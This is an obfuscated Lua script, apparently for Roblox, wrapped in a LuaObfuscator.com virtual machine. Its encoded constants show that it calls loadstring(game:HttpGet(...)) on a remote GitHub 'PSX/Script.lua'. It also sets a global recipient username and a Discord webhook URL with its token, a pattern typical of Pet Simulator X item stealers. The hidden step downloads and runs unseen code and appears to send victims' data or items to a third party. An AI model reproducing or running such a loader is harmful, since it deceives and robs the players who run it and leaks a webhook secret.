--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v20)if (v1(v20,2)==79) then local v69=0;while true do if (v69==0) then v19=v0(v3(v20,1,1));return "";end end else local v70=v2(v0(v20,16));if v19 then local v78=v5(v70,v19);v19=nil;return v78;else return v70;end end end);local function v21(v22,v23,v24)if v24 then local v71=857 -(405 + 452) ;local v72;while true do if ((1800 -((1170 -(289 + 379)) + 1298))==v71) then v72=(v22/((6 -4)^(v23-(1 + 0))))%(2^(((v24-(2 -1)) -(v23-(1034 -(955 + 78)))) + (1102 -(870 + 231)))) ;return v72-(v72%1) ;end end else local v73=(0 -0) + 0 ;local v74;while true do if (v73==(0 -(0 + 0))) then v74=(4 -2)^(v23-1) ;return (((v22%(v74 + v74))>=v74) and (3 -2)) or (0 -(1676 -(194 + 1482))) ;end end end end local function v25()local v38=0 -0 ;local v39;while true do if ((1010 -((993 -610) + 627))==v38) then v39=v1(v16,v18,v18);v18=v18 + (2 -1) ;v38=423 -(378 + 44) ;end if (v38==(2 -1)) then return v39;end end end local function v26()local v40=0 + 0 ;local v41;local v42;while true do if (v40==(1 + 0)) then return (v42 * (54 + 202)) + v41 ;end if (v40==(1517 -(150 + 1367))) then v41,v42=v1(v16,v18,v18 + (4 -2) );v18=v18 + (8 -(1 + 5)) ;v40=(1 -0) -0 ;end end end local function v27()local v43,v44,v45,v46=v1(v16,v18,v18 + (3 -0) );v18=v18 + 1 + 3 ;return (v46 * 16777216) + (v45 * (20410 + 45126)) + (v44 * 256) + v43 ;end local function v28()local v47=v27();local v48=v27();local v49=1 + 0 ;local v50=(v21(v48,3 -2 ,20 + 0 ) * ((365 -(44 + 319))^((9 + 86) -(2045 -(1570 + 412))))) + v47 ;local v51=v21(v48,21,31);local v52=((v21(v48,76 -44 )==(1 -0)) and  -(1 + 0)) or (600 -(4 + 595)) ;if (v51==(0 + 0)) then if (v50==(669 -(61 + 608))) then return v52 * (0 + 0) ;else v51=1566 -(230 + 1335) ;v49=0 + 0 ;end elseif (v51==(28 + (2348 -(288 + 41)))) then return ((v50==(226 -(148 + 78))) and (v52 * ((2 -1)/(0 + 0)))) or (v52 * NaN) ;end return v8(v52,v51-(963 + 26 + 34) ) * (v49 + (v50/((659 -(529 + 121 + 7))^(654 -(282 + 320))))) ;end local function v29(v30)local v53=(3218 -(838 + 929)) -((3697 -2581) + 335) ;local v54;local v55;while true do if (v53==2) then v55={};for v79=2 -1 , #v54 do v55[v79]=v2(v1(v3(v54,v79,v79)));end v53=3 + 0 ;end if (1==v53) then v54=v3(v16,v18,(v18 + v30) -(1267 -(112 + 1154)) );v18=v18 + v30 ;v53=2;end if (v53==(0 -0)) then v54=nil;if  not v30 then v30=v27();if (v30==(490 -(294 + 196))) then return "";end end v53=159 -(5 + 153) ;end if ((1452 -(1105 + 344))==v53) then return v6(v55);end end end local v31=v27;local function v32(...)return {...},v12("#",...);end local function v33()local v56=1430 -(1323 + 107) ;local v57;local v58;local v59;local v60;local v61;local v62;local v63;local v64;while true do if (v56==(0 -0)) then v57=0;v58=nil;v56=1;end if (v56==3) then v63=nil;v64=nil;v56=9 -5 ;end if (v56==4) then while true do if (v57~=(0 + 0)) then else local v96=0;local v97;while true do if (v96==(1907 -(1747 + 160))) then v97=0;while true do if (v97~=(858 -(795 + 62))) then else v57=1;break;end if (v97~=(1944 -(1565 + 379))) then else local v112=0;while true do if (v112==(0 -0)) then v58=0;v59=nil;v112=1 -0 ;end if (v112~=1) then else v97=1 + 0 ;break;end end end end break;end end end if (v57==1) then local v98=0;while true do if (v98==1) then v57=2;break;end if (v98==(1380 -(578 + 802))) then local v110=0;while true do if (v110==0) then v60=nil;v61=nil;v110=2 -1 ;end if (v110==1) then v98=2 -1 ;break;end end end end end if (v57~=2) then else local v99=0 + 0 ;local v100;while true do if (0==v99) then v100=0;while true do if ((1352 -(327 + 1024))==v100) then v57=6 -3 ;break;end if (v100==0) then local v113=0;while true do if (v113==(2 -1)) then v100=1 + 0 ;break;end if (v113~=(37 -(14 + 23))) then else v62=nil;v63=nil;v113=1;end end end end break;end end end if (v57~=(2 + 1)) then else v64=nil;while true do local v104=0 -0 ;local v105;while true do if (v104~=0) then else v105=0;while true do if (v105==(380 -(343 + 36))) then if (v58==(1 + 0)) then local v118=0;while true do if (v118~=1) then else v64={};v58=1692 -(954 + 736) ;break;end if (v118~=0) then else local v141=0;while true do if (v141==1) then v118=1 + 0 ;break;end if (0==v141) then v62={v59,v60,nil,v61};v63=v27();v141=1921 -(1137 + 783) ;end end end end end if (3~=v58) then else local v119=0 -0 ;local v120;while true do if (v119~=0) then else v120=0;while true do local v142=1739 -(522 + 1217) ;while true do if (v142==0) then if (v120~=(1 + 0)) then else return v62;end if (v120~=(1052 -(419 + 633))) then else local v155=1416 -(482 + 934) ;while true do if (v155~=(0 + 0)) then else for v162=1,v27() do v60[v162-(1082 -(176 + 905)) ]=v33();end for v164=1 + 0 ,v27() do v61[v164]=v27();end v155=2 -1 ;end if (v155~=(1257 -(657 + 599))) then else v120=1;break;end end end break;end end end break;end end end break;end if (v105~=(0 -0)) then else local v116=0;local v117;while true do if ((1651 -(697 + 954))~=v116) then else v117=1062 -(800 + 262) ;while true do if (v117==1) then v105=1;break;end if ((0 -0)~=v117) then else local v143=0;while true do if (v143==1) then v117=1 -0 ;break;end if (v143==0) then if ((0 + 0)==v58) then local v156=0;local v157;while true do if (v156~=(588 -(148 + 440))) then else v157=0 + 0 ;while true do if (v157==0) then local v166=0;local v167;while true do if ((0 + 0)~=v166) then else v167=0;while true do if (v167==(0 -0)) then local v180=0 + 0 ;while true do if (v180==(1 + 0)) then v167=1;break;end if ((0 -0)==v180) then v59={};v60={};v180=1 + 0 ;end end end if ((376 -(136 + 239))==v167) then v157=1;break;end end break;end end end if (v157~=(1 -0)) then else v61={};v58=1524 -(254 + 1269) ;break;end end break;end end end if (v58==2) then local v158=682 -(440 + 242) ;local v159;while true do if (v158==(578 -(196 + 382))) then v159=0;while true do if (v159~=(923 -(789 + 133))) then else for v169=1 + 0 ,v27() do local v170=0;local v171;local v172;while true do if (v170~=(1 + 0)) then else while true do if (v171==(1429 -(1207 + 222))) then v172=v25();if (v21(v172,4 -3 ,1)==(1587 -(1279 + 308))) then local v181=44 -(24 + 20) ;local v182;local v183;local v184;local v185;local v186;while true do if (v181==1) then v184=nil;v185=nil;v181=2;end if (v181==0) then v182=0 + 0 ;v183=nil;v181=1;end if (v181~=2) then else v186=nil;while true do if (v182~=1) then else local v192=0;while true do if (v192~=(1 -0)) then else v182=1 + 1 ;break;end if (v192~=(589 -(177 + 412))) then else v185=nil;v186=nil;v192=1;end end end if (v182==2) then while true do if (1~=v183) then else local v195=1603 -(715 + 888) ;while true do if (v195==0) then v186={v26(),v26(),nil,nil};if (v184==(1418 -(448 + 970))) then local v202=0;local v203;while true do if (v202==0) then v203=688 -(31 + 657) ;while true do if (v203~=(0 -0)) then else v186[3]=v26();v186[4]=v26();break;end end break;end end elseif (v184==(3 -2)) then v186[597 -(10 + 584) ]=v27();elseif (v184==2) then v186[6 -3 ]=v27() -((1 + 1)^16) ;elseif (v184~=3) then else local v212=0 -0 ;local v213;while true do if (v212~=0) then else v213=0 + 0 ;while true do if (v213~=0) then else v186[3]=v27() -((14 -(8 + 4))^16) ;v186[4 + 0 ]=v26();break;end end break;end end end v195=1;end if (v195==1) then v183=2;break;end end end if (v183==(5 -2)) then if (v21(v185,6 -3 ,2 + 1 )==1) then v186[4]=v64[v186[6 -2 ]];end v59[v169]=v186;break;end if (v183==2) then local v197=119 -(109 + 10) ;while true do if (v197~=(1 + 0)) then else v183=3;break;end if (v197~=0) then else if (v21(v185,658 -(158 + 499) ,3 -2 )==(719 -(8 + 710))) then v186[2]=v64[v186[2]];end if (v21(v185,630 -(419 + 209) ,2)==(1 + 0)) then v186[3]=v64[v186[3]];end v197=1 + 0 ;end end end if (v183==0) then local v198=0 + 0 ;while true do if ((2 -1)~=v198) then else v183=1;break;end if (v198==(0 -0)) then v184=v21(v172,2,874 -(10 + 861) );v185=v21(v172,4,527 -(286 + 235) );v198=1176 -(335 + 840) ;end end end end break;end if ((0 + 0)~=v182) then else local v193=1983 -(1960 + 23) ;while true do if ((1302 -(129 + 1172))~=v193) then else v182=1 -0 ;break;end if (v193~=(0 + 0)) then else v183=0;v184=nil;v193=1;end end end end break;end end end break;end end break;end if ((0 -0)~=v170) then else v171=0;v172=nil;v170=1 + 0 ;end end end v58=2 + 1 ;break;end if (v159==(422 -(265 + 157))) then local v168=0 + 0 ;while true do if (v168==(1 + 0)) then v159=1;break;end if (v168~=0) then else for v174=1,v63 do local v175=0;local v176;local v177;local v178;local v179;while true do if (v175==(1 + 0)) then v178=nil;v179=nil;v175=2;end if (2==v175) then while true do if (v176~=1) then else v179=nil;while true do if (v177~=1) then else if (v178==(2 -1)) then v179=v25()~=0 ;elseif (v178==2) then v179=v28();elseif (v178==(2 + 1)) then v179=v29();end v64[v174]=v179;break;end if (v177==0) then local v190=0 -0 ;local v191;while true do if (v190==0) then v191=1248 -(693 + 555) ;while true do if ((0 -0)~=v191) then else local v199=0 -0 ;while true do if (1~=v199) then else v191=2 -1 ;break;end if (v199~=(0 + 0)) then else v178=v25();v179=nil;v199=1;end end end if (v191~=1) then else v177=1829 -(549 + 1279) ;break;end end break;end end end end break;end if (v176==0) then local v187=0 -0 ;local v188;while true do if (v187==(1582 -(582 + 1000))) then v188=1387 -(531 + 856) ;while true do if (v188==(770 -(307 + 462))) then v176=1 + 0 ;break;end if ((0 + 0)==v188) then local v194=0;while true do if ((0 -0)~=v194) then else v177=0 -0 ;v178=nil;v194=1;end if (v194~=1) then else v188=1 + 0 ;break;end end end end break;end end end end break;end if ((0 + 0)~=v175) then else v176=0;v177=nil;v175=1;end end end v62[917 -(66 + 848) ]=v25();v168=1;end end end end break;end end end v143=2 -1 ;end end end end break;end end end end break;end end end break;end end break;end if (v56~=(1 + 0)) then else v59=nil;v60=nil;v56=2;end if (v56~=2) then else v61=nil;v62=nil;v56=3;end end end local function v34(v35,v36,v37)local v65=0;local v66;local v67;local v68;while true do if (v65==1) then v68=v35[3];return function(...)local v81=1;local v82= -1;local v83={...};local v84=v12("#",...) -1 ;local function v85()local v86=v66;local v87=v67;local v88=v68;local v89=v32;local v90={};local v91={};local v92={};for v101=0 + 0 ,v84 do if (((2791 -(1183 + (662 -(26 + 31))))<=(4060 -(607 + 862))) and (v101>=v88)) then v90[v101-v88 ]=v83[v101 + 1 + 0 ];else v92[v101]=v83[v101 + 1 + 0 + 0 ];end end local v93=(v84-v88) + (1054 -(14 + 1039)) ;local v94;local v95;while true do local v102=(827 -(71 + 756)) -0 ;while true do if (((6008 -3400)>=507) and ((1 + 0)==v102)) then if (((5261 -(1049 + 386))==(4189 -(125 + 238))) and (v95<=(10 -5))) then if (((5188 -2874)<=(4826 -(62 + 375))) and (v95<=((8 -1) -5))) then if ((1611<=(10883 -7809)) and (v95<=(288 -(7 + (667 -(191 + 195)))))) then local v121=0 -0 ;local v122;local v123;while true do if ((v121==(497 -(204 + 292))) or ((5584 -(558 + 542))<158)) then while true do if (((2802 -((382 -184) + 441 + 1285))==(74 + 804)) and (v122==(0 + 0))) then v123=v94[(184 + 413) -(263 + 332) ];v92[v123]=v92[v123](v13(v92,v123 + (3 -2) ,v82));break;end end break;end if (((4022 -(233 + 708))>(322 -(239 + 3 + 24))) and ((0 -0)==v121)) then v122=(1125 -(508 + 617)) -0 ;v123=nil;v121=1135 -(519 + 615) ;end end elseif ((v95>(1 + 0)) or ((3320 -(484 + (889 -(29 + 171))))>=3451)) then v92[v94[2 + 0 + 0 ]]();else local v127=0;local v128;local v129;local v130;local v131;while true do if (((4309 -(606 + 145))>(822 -644)) and ((1 + 0)==v127)) then v82=(v130 + v128) -(1664 -(518 + 1145)) ;v131=1924 -(715 + 1209) ;v127=2 -0 ;end if ((v127==(9 -(6 + 1))) or ((155 + 430)>(1471 -(159 + 305)))) then for v153=v128,v82 do local v154=0 -0 ;while true do if ((v154==((4212 -2454) -(1680 + 78))) or ((1185 -538)>=(11990 -7825))) then v131=v131 + (21 -(8 + 5 + 7)) ;v92[v153]=v129[v131];break;end end end break;end if (((326 + 2490)>=((3741 -2732) -532)) and (v127==(0 + 0))) then v128=v94[(196 -(187 + 7)) + 0 ];v129,v130=v89(v92[v128](v13(v92,v128 + (540 -(475 + 64)) ,v94[1669 -(1090 + 576) ])));v127=1 + 0 ;end end end elseif ((v95<=3) or ((3543 + 384)<=((2604 + 3057) -3649))) then if ((v92[v94[874 -(343 + 529) ]]==v94[15 -11 ]) or ((5009 -2817)<(1020 + 881))) then v81=v81 + 1 + 0 ;else v81=v94[1456 -(1041 + 386 + 26) ];end elseif ((v95==(12 -8)) or (907>(5723 -(412 + 514)))) then v37[v94[923 -(771 + 149) ]]=v92[v94[1137 -(283 + (2022 -1170)) ]];else v92[v94[1918 -(314 + 1602) ]]=v94[1957 -(1011 + 943) ];end elseif (((2551 -((2748 -1199) + 308))<(1811 + 1783)) and (v95<=(922 -(570 + 344)))) then if ((v95<=(855 -(724 + 10 + 115))) or ((517 + 1582)<(1180 + 209))) then v92[v94[1446 -(476 + 968) ]]=v94[1860 -(444 + 1413) ]~=(0 -0) ;elseif (((7993 -3052)>=(4224 -(249 + 868))) and (v95>(1124 -(1073 + 44)))) then do return;end else v81=v94[7 -4 ];end elseif ((v95<=(1494 -(1020 + 465))) or (((2090 -1161) -324)==(2497 -1431))) then v92[v94[2 -0 ]]=v37[v94[1604 -(1042 + 559) ]];elseif ((v95==(17 -7)) or (1588<(2611 -(166 + 1551)))) then if ((v94[1 + 1 ]==v92[v94[1 + 0 + 3 ]]) or (2293>(2084 + 316))) then v81=v81 + 1 + 0 ;else v81=v94[1858 -(110 + 1745) ];end else local v138=482 -(48 + 434) ;local v139;local v140;while true do if (((2245 -(867 + 464))<=(5105 -3309)) and (v138==(0 + 0))) then v139=v94[638 -(157 + (1821 -(242 + 1100))) ];v140=v92[v94[1552 -(1543 + 6) ]];v138=1 + 0 ;end if ((v138==(2 -(1 + 0))) or ((1306 -503)>((35467 -21158) -10149))) then v92[v139 + (2 -1) + 0 ]=v140;v92[v139]=v140[v94[4 + 0 ]];break;end end end v81=v81 + 1 ;break;end if (((4423 -3239)<=(6991 -3024)) and (v102==0)) then local v111=1416 -(1033 + 383) ;while true do if (((3965 -(372 + 273))>(7313 -5492)) and (v111==0)) then v94=v86[v81];v95=v94[1 -0 ];v111=301 -(38 + 262) ;end if (((3289 + 112)==((3339 + 926) -(582 + 282))) and (v111==(738 -(470 + 267)))) then v102=1 -0 ;break;end end end end end end A,B=v32(v11(v85));if  not A[1] then local v103=v35[4][v81] or "?" ;error("Script error at ["   .. v103   .. "]:"   .. A[2] );else return v13(A,2,B);end end;end if (v65==0) then v66=v35[1];v67=v35[2];v65=1;end end end return v34(v33(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03073O004D656E74696F6E030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403403O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4861726447616D6553732F5053582F6D61696E2F5363726970742E6C756103083O00557365724E616D6503123O0049676F7462616E6564616761696E3130313003073O00576562482O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3130383637303839343534383332303O36372F395643396C524E6B46476D5732435577644C4A7847687574413736444E4465316554583967394F717446504E59784D30376D745041362D6932682O42326677492O32766C00173O0012053O00013O0026033O000E000100020004073O000E00012O0006000100013O001204000100033O001209000100043O001209000200053O00200B000200020006001205000400074O0006000500014O0001000200056O00013O00022O00020001000100010004073O00160001000E0A0001000100013O0004073O00010001001205000100093O001204000100083O0012050001000B3O0012040001000A3O0012053O00023O0004073O000100012O00083O00017O00173O00023O00043O00043O00053O00053O00063O00063O00063O00063O00063O00063O00063O00063O00073O00093O00093O000A3O000A3O000B3O000B3O000C3O000D3O000F3O00",v9(),...);end